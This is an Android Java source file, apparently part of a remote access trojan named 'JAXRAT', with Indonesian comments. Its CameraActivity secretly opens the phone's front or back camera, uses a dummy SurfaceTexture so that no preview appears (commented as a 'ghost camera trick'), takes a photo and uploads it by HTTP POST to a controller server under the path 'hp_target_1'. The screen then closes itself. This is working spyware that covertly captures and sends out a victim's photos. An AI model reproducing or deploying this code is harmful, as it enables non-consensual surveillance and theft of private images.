package com.ezax.agent;

import android.Manifest;
import android.content.pm.PackageManager;
import android.graphics.SurfaceTexture;
import android.hardware.Camera;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;

public class CameraActivity extends AppCompatActivity {
    private Camera camera;
    private int cameraId = 0;
    private boolean isFront = false;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
            Log.e("JAXRAT", "Izin kamera ditolak!");
            finish(); return;
        }

        isFront = getIntent().getBooleanExtra("FRONT", false);

        try {
            Camera.CameraInfo cameraInfo = new Camera.CameraInfo();
            int cameraCount = Camera.getNumberOfCameras();
            
            for (int camIdx = 0; camIdx < cameraCount; camIdx++) {
                Camera.getCameraInfo(camIdx, cameraInfo);
                if (isFront && cameraInfo.facing == Camera.CameraInfo.CAMERA_FACING_FRONT) {
                    cameraId = camIdx;
                    break;
                } else if (!isFront && cameraInfo.facing == Camera.CameraInfo.CAMERA_FACING_BACK) {
                    cameraId = camIdx;
                    break;
                }
            }

            camera = Camera.open(cameraId);
            
            // TRIK KAMERA HANTU: Pakai SurfaceTexture bohongan (ID 10)
            SurfaceTexture dummySurface = new SurfaceTexture(10);
            camera.setPreviewTexture(dummySurface);
            camera.startPreview();

            // Jeda 1.5 detik biar kamera siap (fokus & exposure)
            new Handler(Looper.getMainLooper()).postDelayed(() -> {
                try {
                    camera.takePicture(null, null, (data, cam) -> {
                        uploadImage(data);
                    });
                } catch (Exception e) {
                    Log.e("JAXRAT", "Gagal ambil foto", e);
                    finish();
                }
            }, 1500);

        } catch (Exception e) {
            Log.e("JAXRAT", "Kamera Error Total", e);
            finish(); // Tutup layar kalau kamera gagal dibuka
        }
    }

    private void uploadImage(byte[] imageBytes) {
        new Thread(() -> {
            try {
                // PASTIKAN IP INI SESUAI DENGAN LAPTOP KAMU SEKARANG
                String serverUrl = "http://192.168.1.14:5000/api/upload_image/hp_target_1"; 
                URL url = new URL(serverUrl);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setDoOutput(true);
                conn.setRequestMethod("POST");
                conn.setConnectTimeout(5000); // Timeout 5 detik
                String boundary = "***";
                conn.setRequestProperty("Content-Type", "multipart/form-data;boundary=" + boundary);

                DataOutputStream request = new DataOutputStream(conn.getOutputStream());
                request.writeBytes("--" + boundary + "\r\n");
                request.writeBytes("Content-Disposition: form-data; name=\"image\";filename=\"image.jpg\"\r\n\r\n");
                request.write(imageBytes);
                request.writeBytes("\r\n--" + boundary + "--\r\n");
                request.flush(); request.close();

                int responseCode = conn.getResponseCode();
                Log.d("JAXRAT", "Upload Foto Selesai: " + responseCode);
            } catch (Exception e) { 
                Log.e("JAXRAT", "Upload Error", e); 
            }
            
            runOnUiThread(this::finish);
        }).start();
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        if (camera != null) {
            try {
                camera.stopPreview();
                camera.release();
            } catch (Exception e) {}
            camera = null;
        }
    }
}
